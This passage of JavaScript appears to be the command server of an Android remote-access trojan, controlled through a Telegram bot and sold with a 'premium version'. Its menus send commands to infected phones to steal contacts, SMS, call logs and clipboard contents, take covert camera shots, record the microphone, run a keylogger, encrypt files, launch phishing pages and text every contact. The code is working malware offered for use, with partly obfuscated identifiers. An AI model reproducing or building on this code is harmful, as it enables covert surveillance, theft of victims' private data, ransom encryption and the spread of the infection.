    const requiresInput = { "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯": "microphoneDuration", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯": "toastText", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯": "smsNumber", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯": "vibrateDuration", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯": "textToAllContacts", "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯": "notificationText" };
    
    if (requiresPremium.includes(text)) {
        bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @Romeo Uchiha 🩸</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
    } else if (requiresInput[text]) {
        appData.set(actionKey, requiresInput[text]);
        let msg = "<b>👁️‍🗨️ 𝙴𝚗𝚝𝚎𝚛 𝚟𝚊𝚕𝚞𝚎 𝚏𝚘𝚛 𝚝𝚑𝚒𝚜 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n";
        if(text === "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯") msg = "<b>🎤 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 🩸</b>\n\n";
        else if(text === "✯ 𝚃𝚘𝚊𝚜𝚝 ✯") msg = "<b>🔔 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡 👁️‍🗨️</b>\n\n";
        else if(text === "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯") msg = "<b>📤 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂 🩸</b>\n\n";
        bot.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }});
    } else {
        const actionMap = { "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯": "contacts", "✯ 𝚂𝙼𝚂 ✯": "all-sms", "✯ 𝙲𝚊𝚕𝚕𝚜 ✯": "calls", "✯ 𝙰𝚙𝚙𝚜 ✯": "apps", "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯": "main-camera", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯": "selfie-camera", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯": "clipboard", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯": "keylogger-on", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯": "keylogger-off" };
        if (actionMap[text]) {
            emitToDevices(appData.get(targetKey), actionMap[text], []);
            appData.delete(targetKey);
            bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
        }
    }
  } else {
    // Specific Device Selection
    let devMatched = false;
    io.sockets.sockets.forEach((sock, id) => {
        if (text === sock.model && sock.chatId === chatId && sock.botName === activeBot) {
            devMatched = true;
            appData.set(targetKey, id);
            let kb = [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]];
            bot.sendMessage(chatId, `<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${sock.model} 🩸</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: kb, resize_keyboard: true, one_time_keyboard: true }});
        }
    });
    if (!devMatched && text === "✯ 𝙰𝚕𝚕 ✯") {
        appData.set(targetKey, "all");
        let kb = [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]];
        bot.sendMessage(chatId, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 👁️‍🗨️</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: kb, resize_keyboard: true, one_time_keyboard: true }});
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 0x1388);

setInterval(() => {
  https.get(data.host || BASE_URL, _0x9df260 => {}).on("error", _0x26bc04 => {});
}, 0x75300);

server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});
